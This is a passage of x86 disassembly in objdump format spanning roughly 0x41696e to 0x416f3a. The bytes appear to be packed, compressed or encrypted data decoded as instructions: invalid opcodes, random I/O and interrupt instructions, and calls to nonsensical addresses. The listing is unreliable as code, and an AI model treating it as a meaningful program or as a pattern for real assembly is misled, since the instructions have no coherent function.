  41696e:	84 0a                	test   %cl,(%edx)
  416970:	d0 86 86 8f 9a d0    	rolb   $1,-0x2f65707a(%esi)
  416976:	cd b0                	int    $0xb0
  416978:	c5 c9 d1 fe          	vpsrlw %xmm6,%xmm6,%xmm7
  41697c:	76 d7                	jbe    0x416955
  41697e:	1d 6d 93 aa 0a       	sbb    $0xaaa936d,%eax
  416983:	cc                   	int3
  416984:	84 99 0b a8 b7 b0    	test   %bl,-0x4f4857f5(%ecx)
  41698a:	a9 5d 6a b5 d2       	test   $0xd2b56a5d,%eax
  41698f:	d3 1d af 2c e6 d4    	rcrl   %cl,0xd4e62caf
  416995:	d4 6d                	aam    $0x6d
  416997:	72 c9                	jb     0x416962
  416999:	3a 83 d1 54 32 d4    	cmp    -0x2bcdab2f(%ebx),%al
  41699f:	d9 6a e4             	fldcw  -0x1c(%edx)
  4169a2:	6a cd                	push   $0xffffffcd
  4169a4:	0f 5d 1a             	minps  (%edx),%xmm3
  4169a7:	2f                   	das
  4169a8:	50                   	push   %eax
  4169a9:	d6                   	salc
  4169aa:	da d6                	fcmovbe %st(6),%st
  4169ac:	39 88 23 be 4f c9    	cmp    %ecx,-0x36b041dd(%eax)
  4169b2:	c7                   	(bad)
  4169b3:	e1 36                	loope  0x4169eb
  4169b5:	fa                   	cli
  4169b6:	dc 43 d3             	faddl  -0x2d(%ebx)
  4169b9:	aa                   	stos   %al,%es:(%edi)
  4169ba:	c2 db fc             	ret    $0xfcdb
  4169bd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4169be:	e7 31                	out    %eax,$0x31
  4169c0:	a8 21                	test   $0x21,%al
  4169c2:	7f bb                	jg     0x41697f
  4169c4:	99                   	cltd
  4169c5:	ba c6 84 9a 10       	mov    $0x109a84c6,%edx
  4169ca:	b3 b6                	mov    $0xb6,%bl
  4169cc:	b0 a5                	mov    $0xa5,%al
  4169ce:	b2 a8                	mov    $0xa8,%dl
  4169d0:	35 2a b4 d7 9b       	xor    $0x9bd7b42a,%eax
  4169d5:	1b 98 11 eb b4 d1    	sbb    -0x2e4b14ef(%eax),%ebx
  4169db:	1c ae                	sbb    $0xae,%al
  4169dd:	27                   	daa
  4169de:	84 42 de             	test   %al,-0x22(%edx)
  4169e1:	49                   	dec    %ecx
  4169e2:	c5 ab 61 ba 6d d6    	lds    -0x2992459f(%ebx),%ebp
  4169e8:	c9                   	leave
  4169e9:	52                   	push   %edx
  4169ea:	97                   	xchg   %eax,%edi
  4169eb:	ac                   	lods   %ds:(%esi),%al
  4169ec:	10 4f d1             	adc    %cl,-0x2f(%edi)
  4169ef:	3a 5a e1             	cmp    -0x1f(%edx),%bl
  4169f2:	86 5c c9 de          	xchg   %bl,-0x22(%ecx,%ecx,8)
  4169f6:	06                   	push   %es
  4169f7:	48                   	dec    %eax
  4169f8:	14 d7                	adc    $0xd7,%al
  4169fa:	d6                   	salc
  4169fb:	de 7e b3             	fidivrs -0x4d(%esi)
  4169fe:	0d 6e cd c8 11       	or     $0x11c8cd6e,%eax
  416a03:	c9                   	leave
  416a04:	91                   	xchg   %eax,%ecx
  416a05:	b7 c0                	mov    $0xc0,%bh
  416a07:	84 5b be             	test   %bl,-0x42(%ebx)
  416a0a:	34 d9                	xor    $0xd9,%al
  416a0c:	d2 15 b0 e2 c8 b3    	rclb   %cl,0xb3c8e2b0
  416a12:	ca b8 b6             	lret   $0xb6b8
  416a15:	ee                   	out    %al,(%dx)
  416a16:	5a                   	pop    %edx
  416a17:	bb 60 aa d7 2d       	mov    $0x2dd7aa60,%ebx
  416a1c:	2c b7                	sub    $0xb7,%al
  416a1e:	90                   	nop
  416a1f:	4e                   	dec    %esi
  416a20:	64 b5 55             	fs mov $0x55,%ch
  416a23:	d8 96 8b 98 a9 a9    	fcoms  -0x56566775(%esi)
  416a29:	f5                   	cmc
  416a2a:	d7                   	xlat   %ds:(%ebx)
  416a2b:	c6                   	(bad)
  416a2c:	d6                   	salc
  416a2d:	b6 b6                	mov    $0xb6,%dh
  416a2f:	a9 d6 e2 ca d3       	test   $0xd3cae2d6,%eax
  416a34:	73 0d                	jae    0x416a43
  416a36:	97                   	xchg   %eax,%edi
  416a37:	91                   	xchg   %eax,%ecx
  416a38:	74 dd                	je     0x416a17
  416a3a:	ba 72 db d8 38       	mov    $0x38d8db72,%edx
  416a3f:	92                   	xchg   %eax,%edx
  416a40:	db 43 d6             	fildl  -0x2a(%ebx)
  416a43:	4c                   	dec    %esp
  416a44:	c5 ca 70             	(bad)
  416a47:	bb 6c a1 e4 ae       	mov    $0xaee4a16c,%ebx
  416a4c:	c6                   	(bad)
  416a4d:	15 ac 57 ca 91       	adc    $0x91ca57ac,%eax
  416a52:	0c ff                	or     $0xff,%al
  416a54:	70 b9                	jo     0x416a0f
  416a56:	9e                   	sahf
  416a57:	ca c9 b3             	lret   $0xb3c9
  416a5a:	b2 87                	mov    $0x87,%dl
  416a5c:	de cd                	fmulp  %st,%st(5)
  416a5e:	d4 84                	aam    $0x84
  416a60:	9c                   	pushf
  416a61:	26 36 b0 db          	es ss mov $0xdb,%al
  416a65:	e6 0a                	out    %al,$0xa
  416a67:	2d d6 2c 92 96       	sub    $0x96922cd6,%eax
  416a6c:	39 23                	cmp    %esp,(%ebx)
  416a6e:	87 87 2d fb b0 ad    	xchg   %eax,-0x524f04d3(%edi)
  416a74:	b2 a9                	mov    $0xa9,%dl
  416a76:	35 10 ab d6 08       	xor    $0x8d6ab10,%eax
  416a7b:	12 9a a9 73 98 25    	adc    0x259873a9(%edx),%bl
  416a81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416a82:	5d                   	pop    %ebp
  416a83:	2a 7c 7b 30          	sub    0x30(%ebx,%edi,2),%bh
  416a87:	fd                   	std
  416a88:	c0 55 be c5          	rclb   $0xc5,-0x42(%ebp)
  416a8c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416a8d:	b9 88 a8 fb 16       	mov    $0x16fba888,%ecx
  416a92:	36 36 53             	ss ss push %ebx
  416a95:	4b                   	dec    %ebx
  416a96:	63 da                	arpl   %ebx,%edx
  416a98:	eb 99                	jmp    0x416a33
  416a9a:	81 b2 ab 61 f6 97 74 	xorl   $0xa7adaa74,-0x68099e55(%edx)
  416aa1:	aa ad a7 
  416aa4:	ad                   	lods   %ds:(%esi),%eax
  416aa5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416aa6:	b0 23                	mov    $0x23,%al
  416aa8:	73 dd                	jae    0x416a87
  416aaa:	3b 7d a0             	cmp    -0x60(%ebp),%edi
  416aad:	55                   	push   %ebp
  416aae:	ea 84 c1 b6 1d a5 cb 	ljmp   $0xcba5,$0x1db6c184
  416ab5:	6c                   	insb   (%dx),%es:(%edi)
  416ab6:	c0 d0 d4             	rcl    $0xd4,%al
  416ab9:	62 ca d2             	(bad) {ru-bad},{%k4}{z}
  416abc:	d4 74                	aam    $0x74
  416abe:	cb                   	lret
  416abf:	90                   	nop
  416ac0:	b2 db                	mov    $0xdb,%dl
  416ac2:	85 66 2a             	test   %esp,0x2a(%esi)
  416ac5:	01 bb 63 3b cd ba    	add    %edi,-0x4532c49d(%ebx)
  416acb:	12 d9                	adc    %cl,%bl
  416acd:	38 10                	cmp    %dl,(%eax)
  416acf:	36 30 2f             	xor    %ch,%ss:(%edi)
  416ad2:	96                   	xchg   %eax,%esi
  416ad3:	e8 a8 a4 9b 6b       	call   0x6bdd0f80
  416ad8:	1b 83 d1 db 03 3d    	sbb    0x3d03dbd1(%ebx),%eax
  416ade:	71 bc                	jno    0x416a9c
  416ae0:	90                   	nop
  416ae1:	cc                   	int3
  416ae2:	c0 1d 5b 97 46 ca 0b 	rcrb   $0xb,0xca46975b
  416ae9:	c9                   	leave
  416aea:	62 84 8c a9 32 94 b7 	bound  %eax,-0x486bcd57(%esp,%ecx,4)
  416af1:	2a 46 20             	sub    0x20(%esi),%al
  416af4:	cc                   	int3
  416af5:	8d 90 d5 b9 b7 80    	lea    -0x7f48462b(%eax),%edx
  416afb:	51                   	push   %ecx
  416afc:	ac                   	lods   %ds:(%esi),%al
  416afd:	7f 81                	jg     0x416a80
  416aff:	b4 95                	mov    $0x95,%ah
  416b01:	90                   	nop
  416b02:	c7                   	(bad)
  416b03:	62 15 c0 6d b5 c9    	bound  %edx,0xc9b56dc0
  416b09:	41                   	inc    %ecx
  416b0a:	03 69 6e             	add    0x6e(%ecx),%ebp
  416b0d:	34 87                	xor    $0x87,%al
  416b0f:	01 16                	add    %edx,(%esi)
  416b11:	81 7a d5 90 aa 51 88 	cmpl   $0x8851aa90,-0x2b(%edx)
  416b18:	cd 1a                	int    $0x1a
  416b1a:	91                   	xchg   %eax,%ecx
  416b1b:	84 7b a5             	test   %bh,-0x5b(%ebx)
  416b1e:	0a 1d a5 cd 9d 77    	or     0x779dcda5,%bl
  416b24:	aa                   	stos   %al,%es:(%edi)
  416b25:	81 29 dd d0 4c c7    	subl   $0xc74cd0dd,(%ecx)
  416b2b:	76 e0                	jbe    0x416b0d
  416b2d:	eb 7a                	jmp    0x416ba9
  416b2f:	42                   	inc    %edx
  416b30:	a0 d2 bc a5 8f       	mov    0x8fa5bcd2,%al
  416b35:	90                   	nop
  416b36:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416b37:	e5 c2                	in     $0xc2,%eax
  416b39:	81 8d 25 de dd c5 cb 	orl    $0xb9c9e1cb,-0x3a2221db(%ebp)
  416b40:	e1 c9 b9 
  416b43:	1b 85 d9 cf 63 04    	sbb    0x463cfd9(%ebp),%eax
  416b49:	36 d2 fd             	ss sar %cl,%ch
  416b4c:	07                   	pop    %es
  416b4d:	70 35                	jo     0x416b84
  416b4f:	53                   	push   %ebx
  416b50:	0e                   	push   %cs
  416b51:	2c c7                	sub    $0xc7,%al
  416b53:	da b8 73 bb 49 3a    	fidivrl 0x3a49bb73(%eax)
  416b59:	72 ab                	jb     0x416b06
  416b5b:	cd 4d                	int    $0x4d
  416b5d:	f5                   	cmc
  416b5e:	aa                   	stos   %al,%es:(%edi)
  416b5f:	95                   	xchg   %eax,%ebp
  416b60:	84 21                	test   %ah,(%ecx)
  416b62:	06                   	push   %es
  416b63:	85 4f 61             	test   %ecx,0x61(%edi)
  416b66:	b4 cd                	mov    $0xcd,%ah
  416b68:	dc e9                	fsubr  %st,%st(1)
  416b6a:	10 af 6b 63 dc 5c    	adc    %ch,0x5cdc636b(%edi)
  416b70:	51                   	push   %ecx
  416b71:	8e ad 84 40 90 ae    	mov    -0x516fbf7c(%ebp),%gs
  416b77:	3b e1                	cmp    %ecx,%esp
  416b79:	be c6 46 01 d9       	mov    $0xd90146c6,%esi
  416b7e:	c5 af b6 89 11 03    	lds    0x31189b6(%edi),%ebp
  416b84:	b7 a1                	mov    $0xa1,%bh
  416b86:	ea c5 92 95 18 f4 0d 	ljmp   $0xdf4,$0x189592c5
  416b8d:	77 6b                	ja     0x416bfa
  416b8f:	87 ce                	xchg   %ecx,%esi
  416b91:	99                   	cltd
  416b92:	42                   	inc    %edx
  416b93:	0b d7                	or     %edi,%edx
  416b95:	c7                   	(bad)
  416b96:	9d                   	popf
  416b97:	fd                   	std
  416b98:	1c a1                	sbb    $0xa1,%al
  416b9a:	99                   	cltd
  416b9b:	1a 02                	sbb    (%edx),%al
  416b9d:	13 13                	adc    (%ebx),%edx
  416b9f:	cd 84                	int    $0x84
  416ba1:	b0 85                	mov    $0x85,%al
  416ba3:	86 2b                	xchg   %ch,(%ebx)
  416ba5:	f0 a6                	lock cmpsb %es:(%edi),%ds:(%esi)
  416ba7:	19 b6 ba 2e 8c 86    	sbb    %esi,-0x7973d146(%esi)
  416bad:	36 18 55 97          	sbb    %dl,%ss:-0x69(%ebp)
  416bb1:	bd 04 c5 02 06       	mov    $0x602c504,%ebp
  416bb6:	85 b6 05 c4 cd 6f    	test   %esi,0x6fcdc405(%esi)
  416bbc:	3d e6 35 53 73       	cmp    $0x735335e6,%eax
  416bc1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416bc2:	61                   	popa
  416bc3:	0e                   	push   %cs
  416bc4:	32 7c 25 e4          	xor    -0x1c(%ebp,%eiz,1),%bh
  416bc8:	4c                   	dec    %esp
  416bc9:	af                   	scas   %es:(%edi),%eax
  416bca:	d6                   	salc
  416bcb:	9b                   	fwait
  416bcc:	bb 37 7a f2 38       	mov    $0x38f27a37,%ebx
  416bd1:	1a 0e                	sbb    (%esi),%cl
  416bd3:	76 ba                	jbe    0x416b8f
  416bd5:	24 cb                	and    $0xcb,%al
  416bd7:	cc                   	int3
  416bd8:	44                   	inc    %esp
  416bd9:	d2 84 95 a3 ca eb 3e 	rolb   %cl,0x3eebcaa3(%ebp,%edx,4)
  416be0:	3f                   	aas
  416be1:	38 0a                	cmp    %cl,(%edx)
  416be3:	17                   	pop    %ss
  416be4:	a9 dd c9 af d6       	test   $0xd6afc9dd,%eax
  416be9:	61                   	popa
  416bea:	d2 7d d0             	sarb   %cl,-0x30(%ebp)
  416bed:	d4 72                	aam    $0x72
  416bef:	70 d3                	jo     0x416bc4
  416bf1:	dd 4a 13             	fisttpll 0x13(%edx)
  416bf4:	da ab d7 3d 46 70    	fisubrl 0x70463dd7(%ebx)
  416bfa:	4f                   	dec    %edi
  416bfb:	d1 97 bd 5c ac 15    	rcll   $1,0x15ac5cbd(%edi)
  416c01:	34 75                	xor    $0x75,%al
  416c03:	bb c2 b8 6a 61       	mov    $0x616ab8c2,%ebx
  416c08:	95                   	xchg   %eax,%ebp
  416c09:	9c                   	pushf
  416c0a:	60                   	pusha
  416c0b:	c9                   	leave
  416c0c:	22 84 c2 83 76 2a cc 	and    -0x33d5897d(%edx,%eax,8),%al
  416c13:	f8                   	clc
  416c14:	09 dc                	or     %ebx,%esp
  416c16:	13 44 70 33          	adc    0x33(%eax,%esi,2),%eax
  416c1a:	be ca 98 7f 6c       	mov    $0x6c7f98ca,%esi
  416c1f:	1e                   	push   %ds
  416c20:	42                   	inc    %edx
  416c21:	e1 c1                	loope  0x416be4
  416c23:	7b 34                	jnp    0x416c59
  416c25:	24 06                	and    $0x6,%al
  416c27:	3b 85 1e 33 57 83    	cmp    -0x7ca8cce2(%ebp),%eax
  416c2d:	09 7d 97             	or     %edi,-0x69(%ebp)
  416c30:	41                   	inc    %ecx
  416c31:	c1 fb 0c             	sar    $0xc,%ebx
  416c34:	1c d8                	sbb    $0xd8,%al
  416c36:	46                   	inc    %esi
  416c37:	9d                   	popf
  416c38:	b2 a5                	mov    $0xa5,%dl
  416c3a:	1a 9c 6b c2 36 2d cd 	sbb    -0x32d2c93e(%ebx,%ebp,2),%bl
  416c41:	0e                   	push   %cs
  416c42:	94                   	xchg   %eax,%esp
  416c43:	29 d8                	sub    %ebx,%eax
  416c45:	d5 b4                	aad    $0xb4
  416c47:	f0 15 b6 27 ba 15    	lock adc $0x15ba27b6,%eax
  416c4d:	cc                   	int3
  416c4e:	e5 c5                	in     $0xc5,%eax
  416c50:	ac                   	lods   %ds:(%esi),%al
  416c51:	07                   	pop    %es
  416c52:	0b cd                	or     %ebp,%ecx
  416c54:	a2 c3 56 c7 5f       	mov    %al,0x5fc756c3
  416c59:	28 75 b5             	sub    %dh,-0x4b(%ebp)
  416c5c:	86 d8                	xchg   %bl,%al
  416c5e:	fa                   	cli
  416c5f:	f6 a7 51 8a d8 68    	mulb   0x68d88a51(%edi)
  416c65:	6e                   	outsb  %ds:(%esi),(%dx)
  416c66:	d6                   	salc
  416c67:	d4 bb                	aam    $0xbb
  416c69:	d4 c9                	aam    $0xc9
  416c6b:	d2 b8 14 1e db 83    	sarb   %cl,-0x7c24e1ec(%eax)
  416c71:	33 b8 3e 67 63 dc    	xor    -0x239c98c2(%eax),%edi
  416c77:	cb                   	lret
  416c78:	42                   	inc    %edx
  416c79:	cb                   	lret
  416c7a:	cb                   	lret
  416c7b:	f4                   	hlt
  416c7c:	c4 13                	les    (%ebx),%edx
  416c7e:	28 a9 92 84 d1 a0    	sub    %ch,-0x5f2e7b6e(%ecx)
  416c84:	ae                   	scas   %es:(%edi),%al
  416c85:	05 87 83 b9 ba       	add    $0xbab98387,%eax
  416c8a:	3c 8a                	cmp    $0x8a,%al
  416c8c:	8b b6 15 76 e3 ac    	mov    -0x531c89eb(%esi),%esi
  416c92:	bc 7c 0c c6 02       	mov    $0x2c60c7c,%esp
  416c97:	fc                   	cld
  416c98:	e8 0c 0f 87 c1       	call   0xc1c87ba9
  416c9d:	53                   	push   %ebx
  416c9e:	cc                   	int3
  416c9f:	36 d2 78 d0          	sarb   %cl,%ss:-0x30(%eax)
  416ca3:	22 70 73             	and    0x73(%eax),%dh
  416ca6:	40                   	inc    %eax
  416ca7:	33 3e                	xor    (%esi),%edi
  416ca9:	5f                   	pop    %edi
  416caa:	7b b9                	jnp    0x416c65
  416cac:	e8 76 b4 24 4c       	call   0x4c662127
  416cb1:	70 f1                	jo     0x416ca4
  416cb3:	d1 df                	rcr    $1,%edi
  416cb5:	32 0e                	xor    (%esi),%cl
  416cb7:	75 2c                	jne    0x416ce5
  416cb9:	ac                   	lods   %ds:(%esi),%al
  416cba:	97                   	xchg   %eax,%edi
  416cbb:	15 09 ca 6e 3b       	adc    $0x3b6eca09,%eax
  416cc0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  416cc1:	09 80 30 b9 94 d0    	or     %eax,-0x2f6b46d0(%eax)
  416cc7:	98                   	cwtl
  416cc8:	86 f6                	xchg   %dh,%dh
  416cca:	c0 09 5e             	rorb   $0x5e,(%ecx)
  416ccd:	96                   	xchg   %eax,%esi
  416cce:	68 ac 0e 3e 9a       	push   $0x9a3e0eac
  416cd3:	89 af 75 43 b7 19    	mov    %ebp,0x19b74375(%edi)
  416cd9:	65 a5                	movsl  %gs:(%esi),%es:(%edi)
  416cdb:	57                   	push   %edi
  416cdc:	02 b6 67 30 d0 8c    	add    -0x732fcf99(%esi),%dh
  416ce2:	6d                   	insl   (%dx),%es:(%edi)
  416ce3:	72 cf                	jb     0x416cb4
  416ce5:	18 d1                	sbb    %dl,%cl
  416ce7:	03 b7 58 25 80 b5    	add    -0x4a7fdaa8(%edi),%esi
  416ced:	e1 c6                	loope  0x416cb5
  416cef:	c9                   	leave
  416cf0:	40                   	inc    %eax
  416cf1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  416cf2:	e6 4a                	out    %al,$0x4a
  416cf4:	34 45                	xor    $0x45,%al
  416cf6:	8f                   	(bad)
  416cf7:	6f                   	outsl  %ds:(%esi),(%dx)
  416cf8:	56                   	push   %esi
  416cf9:	c5 b9 6d c3 73 ca    	lds    -0x358c3c93(%ecx),%edi
  416cff:	75 28                	jne    0x416d29
  416d01:	a8 db                	test   $0xdb,%al
  416d03:	0c c6                	or     $0xc6,%al
  416d05:	57                   	push   %edi
  416d06:	2d e6 da 21 ac       	sub    $0xac21dae6,%eax
  416d0b:	bb 6e e8 10 ac       	mov    $0xac10e86e,%ebx
  416d10:	77 eb                	ja     0x416cfd
  416d12:	a2 73 82 77 de       	mov    %al,0xde778273
  416d17:	2a d4                	sub    %ah,%dl
  416d19:	f6 c9 d3             	test   $0xd3,%cl
  416d1c:	c4 02                	les    (%edx),%eax
  416d1e:	53                   	push   %ebx
  416d1f:	7b 41                	jnp    0x416d62
  416d21:	ab                   	stos   %eax,%es:(%edi)
  416d22:	b7 18                	mov    $0x18,%bh
  416d24:	43                   	inc    %ebx
  416d25:	6d                   	insl   (%dx),%es:(%edi)
  416d26:	b9 66 fa 6e 90       	mov    $0x906efa66,%ecx
  416d2b:	dc 24 cd d3 d7 a3 50 	fsubl  0x50a3d7d3(,%ecx,8)
  416d32:	32 8c 3f d8 d1 b6 b4 	xor    -0x4b492e28(%edi,%edi,1),%cl
  416d39:	15 27 c3 92 a3       	adc    $0xa392c327,%eax
  416d3e:	af                   	scas   %es:(%edi),%eax
  416d3f:	cd 98                	int    $0x98
  416d41:	d1 b3 df c4 ed eb    	shll   $1,-0x14123b21(%ebx)
  416d47:	cc                   	int3
  416d48:	c5 d2 9a             	(bad)
  416d4b:	d4 25                	aam    $0x25
  416d4d:	a8 e2                	test   $0xe2,%al
  416d4f:	cf                   	iret
  416d50:	d2 bc 83 a9 e1 e0 02 	sarb   %cl,0x2e0e1a9(%ebx,%eax,4)
  416d57:	d7                   	xlat   %ds:(%ebx)
  416d58:	c5 bd fd 7b 19 68    	lds    0x68197bfd(%ebp),%edi
  416d5e:	2c 06                	sub    $0x6,%al
  416d60:	d5 b9                	aad    $0xb9
  416d62:	b6 e2                	mov    $0xe2,%dh
  416d64:	ed                   	in     (%dx),%eax
  416d65:	c7 84 d7 a2 a9 2b 06 	movl   $0x60cd9cfd,0x62ba9a2(%edi,%edx,8)
  416d6c:	fd 9c cd 60 
  416d70:	d8 82 7b cc ee bc    	fadds  -0x43113385(%edx)
  416d76:	9c                   	pushf
  416d77:	a1 b5 ed a3 c5       	mov    0xc5a3edb5,%eax
  416d7c:	09 b8 58 c6 7b ef    	or     %edi,-0x108439a8(%eax)
  416d82:	9c                   	pushf
  416d83:	f1                   	int1
  416d84:	d0 e6                	shl    $1,%dh
  416d86:	e2 97                	loop   0x416d1f
  416d88:	75 14                	jne    0x416d9e
  416d8a:	d0 7c de 91          	sarb   $1,-0x6f(%esi,%ebx,8)
  416d8e:	5a                   	pop    %edx
  416d8f:	37                   	aaa
  416d90:	cb                   	lret
  416d91:	9a 76 43 d6 93 f7 53 	lcall  $0x53f7,$0x93d64376
  416d98:	a3 f5 70 8b 21       	mov    %eax,0x218b70f5
  416d9d:	46                   	inc    %esi
  416d9e:	70 d0                	jo     0x416d70
  416da0:	a9 0b 3e 36 a7       	test   $0xa7363e0b,%eax
  416da5:	c5 b3 d6 9e b6 5b    	lds    0x5bb69ed6(%ebx),%esi
  416dab:	70 b9                	jo     0x416d66
  416dad:	98                   	cwtl
  416dae:	ab                   	stos   %eax,%es:(%edi)
  416daf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  416db0:	5e                   	pop    %esi
  416db1:	7d 64                	jge    0x416e17
  416db3:	5a                   	pop    %edx
  416db4:	30 6c cd 99          	xor    %ch,-0x67(%ebp,%ecx,8)
  416db8:	ed                   	in     (%dx),%eax
  416db9:	86 a5 57 f6 39 7b    	xchg   %ah,0x7b39f657(%ebp)
  416dbf:	2d 86 5b 13 dd       	sub    $0xdd135b86,%eax
  416dc4:	cc                   	int3
  416dc5:	ff 03                	incl   (%ebx)
  416dc7:	09 c0                	or     %eax,%eax
  416dc9:	b0 2c                	mov    $0x2c,%al
  416dcb:	04 e1                	add    $0xe1,%al
  416dcd:	84 32                	test   %dh,(%edx)
  416dcf:	5f                   	pop    %edi
  416dd0:	d1 d3                	rcl    $1,%ebx
  416dd2:	dc ae e1 70 f0 6a    	fsubrl 0x6af070e1(%esi)
  416dd8:	ae                   	scas   %es:(%edi),%al
  416dd9:	4a                   	dec    %edx
  416dda:	ad                   	lods   %ds:(%esi),%eax
  416ddb:	d7                   	xlat   %ds:(%ebx)
  416ddc:	b5 0e                	mov    $0xe,%ch
  416dde:	0e                   	push   %cs
  416ddf:	0c 3c                	or     $0x3c,%al
  416de1:	e0 aa                	loopne 0x416d8d
  416de3:	bb cb 6b 30 dc       	mov    $0xdc306bcb,%ebx
  416de8:	12 8e a6 b1 d7 5f    	adc    0x5fd7b1a6(%esi),%cl
  416dee:	63 bc 6d 1a d2 9c cc 	arpl   %edi,-0x33632de6(%ebp,%ebp,2)
  416df5:	dd a0 ad aa a5 83    	frstor -0x7c5a5553(%eax)
  416dfb:	00 40 7b             	add    %al,0x7b(%eax)
  416dfe:	61                   	popa
  416dff:	2a 93 3a 16 1b c1    	sub    -0x3ee4e9c6(%ebx),%dl
  416e05:	d0 b5 57 c9 46 c9    	shlb   $1,-0x36b936a9(%ebp)
  416e0b:	1f                   	pop    %ds
  416e0c:	c8 aa 41 8b          	enter  $0x41aa,$0x8b
  416e10:	07                   	pop    %es
  416e11:	c9                   	leave
  416e12:	68 d0 59 f9 f5       	push   $0xf5f959d0
  416e17:	97                   	xchg   %eax,%edi
  416e18:	8d                   	lea    (bad),%ecx
  416e19:	cc                   	int3
  416e1a:	44                   	inc    %esp
  416e1b:	bc 15 0a 00 88       	mov    $0x88000a15,%esp
  416e20:	16                   	push   %ss
  416e21:	8c 04 df             	mov    %es,(%edi,%ebx,8)
  416e24:	94                   	xchg   %eax,%esp
  416e25:	39 75 46             	cmp    %esi,0x46(%ebp)
  416e28:	b6 67                	mov    $0x67,%dh
  416e2a:	30 07                	xor    %al,(%edi)
  416e2c:	05 98 9c f0 21       	add    $0x21f09c98,%eax
  416e31:	a1 5e 89 f4 8d       	mov    0x8df4895e,%eax
  416e36:	85 a0 fe d9 00 23    	test   %esp,0x2300d9fe(%eax)
  416e3c:	4f                   	dec    %edi
  416e3d:	fd                   	std
  416e3e:	47                   	inc    %edi
  416e3f:	3c 95                	cmp    $0x95,%al
  416e41:	da 80 0b 18 f5 0e    	fiaddl 0xef5180b(%eax)
  416e47:	85 3a                	test   %edi,(%edx)
  416e49:	01 10                	add    %edx,(%eax)
  416e4b:	1c 69                	sbb    $0x69,%al
  416e4d:	2a 1e                	sub    (%esi),%bl
  416e4f:	8d 8d a0 f1 3f 3b    	lea    0x3b3ff1a0(%ebp),%ecx
  416e55:	84 c8                	test   %cl,%al
  416e57:	7d db                	jge    0x416e34
  416e59:	02 14 79             	add    (%ecx,%edi,2),%dl
  416e5c:	19 ac 13 f0 3b 99 64 	sbb    %ebp,0x64993bf0(%ebx,%edx,1)
  416e63:	b0 bb                	mov    $0xbb,%al
  416e65:	3e c0 74 58 11 fc    	shlb   $0xfc,%ds:0x11(%eax,%ebx,2)
  416e6b:	46                   	inc    %esi
  416e6c:	c0 02 c5             	rolb   $0xc5,(%edx)
  416e6f:	66 a8 83             	data16 test $0x83,%al
  416e72:	e0 8f                	loopne 0x416e03
  416e74:	10 26                	adc    %ah,(%esi)
  416e76:	c0 df 46             	rcr    $0x46,%bh
  416e79:	50                   	push   %eax
  416e7a:	95                   	xchg   %eax,%ebp
  416e7b:	1f                   	pop    %ds
  416e7c:	b8 08 81 a4 64       	mov    $0x64a48108,%eax
  416e81:	40                   	inc    %eax
  416e82:	06                   	push   %es
  416e83:	eb 45                	jmp    0x416eca
  416e85:	24 13                	and    $0x13,%al
  416e87:	20 10                	and    %dl,(%eax)
  416e89:	d9 58 b5             	fstps  -0x4b(%eax)
  416e8c:	d0 17                	rclb   $1,(%edi)
  416e8e:	e1 7c                	loope  0x416f0c
  416e90:	30 b3 fd 5a 07 bd    	xor    %dh,-0x42f8a503(%ebx)
  416e96:	78 8b                	js     0x416e23
  416e98:	87 0e                	xchg   %ecx,(%esi)
  416e9a:	e4 b9                	in     $0xb9,%al
  416e9c:	30 40 2e             	xor    %al,0x2e(%eax)
  416e9f:	b9 cc 32 a5 98       	mov    $0x98a532cc,%ecx
  416ea4:	12 8a 3f fb 7b 4f    	adc    0x4f7bfb3f(%edx),%cl
  416eaa:	83 bd 81 10 75 37 9c 	cmpl   $0xffffff9c,0x37751081(%ebp)
  416eb1:	80 38 2e             	cmpb   $0x2e,(%eax)
  416eb4:	74 2c                	je     0x416ee2
  416eb6:	87 e6                	xchg   %esp,%esi
  416eb8:	7e 97                	jle    0x416e51
  416eba:	dd ff                	(bad)
  416ebc:	b5 0d                	mov    $0xd,%ch
  416ebe:	68 3c 43 4e 39       	push   $0x394e433c
  416ec3:	44                   	inc    %esp
  416ec4:	c4 96 50 06 0f 49    	les    0x490f0650(%esi),%edx
  416eca:	e8 c2 8e 76 6f       	call   0x6fb7fd91
  416ecf:	28 7b b1             	sub    %bh,-0x4f(%ebx)
  416ed2:	73 18                	jae    0x416eec
  416ed4:	12 1e                	adc    (%esi),%bl
  416ed6:	d9 e1                	fabs
  416ed8:	80 39 2a             	cmpb   $0x2a,(%ecx)
  416edb:	14 5b                	adc    $0x5b,%al
  416edd:	30 a1 8e 64 a1 65    	xor    %ah,0x65a1648e(%ecx)
  416ee3:	f8                   	clc
  416ee4:	ca 37 97             	lret   $0x9737
  416ee7:	84 fa                	test   %bh,%dl
  416ee9:	2d 1b 2e 2e 43       	sub    $0x432e2e1b,%eax
  416eee:	0a 1f                	or     (%edi),%bl
  416ef0:	66 1e                	pushw  %ds
  416ef2:	20 03                	and    %al,(%ebx)
  416ef4:	0d 00 2e 65 78       	or     $0x78652e00,%eax
  416ef9:	e8 9d cf 04 4f       	call   0x4f463e9b
  416efe:	23 04 0e             	and    (%esi,%ecx,1),%eax
  416f01:	2c a1                	sub    $0xa1,%al
  416f03:	be 04 5b 2a 2e       	mov    $0x2e2a5b04,%esi
  416f08:	2a 83 14 10 5e 12    	sub    0x125e1014(%ebx),%al
  416f0e:	77 53                	ja     0x416f63
  416f10:	56                   	push   %esi
  416f11:	fe 40 f8             	incb   -0x8(%eax)
  416f14:	92                   	xchg   %eax,%edx
  416f15:	4d                   	dec    %ebp
  416f16:	5c                   	pop    %esp
  416f17:	11 82 b9 28 82 3e    	adc    %eax,0x3e8228b9(%edx)
  416f1d:	98                   	cwtl
  416f1e:	10 73 5d             	adc    %dh,0x5d(%ebx)
  416f21:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  416f22:	34 0f                	xor    $0xf,%al
  416f24:	f1                   	int1
  416f25:	77 03                	ja     0x416f2a
  416f27:	f6 82 8b 94 b4 05 7e 	testb  $0x7e,0x5b4948b(%edx)
  416f2e:	66 0e                	pushw  %cs
  416f30:	e8 6e 11 c7 88       	call   0x890880a3
  416f35:	02 c4                	add    %ah,%al
  416f37:	d8 43 ab             	fadds  -0x55(%ebx)
  416f3a:	4d                   	dec    %ebp
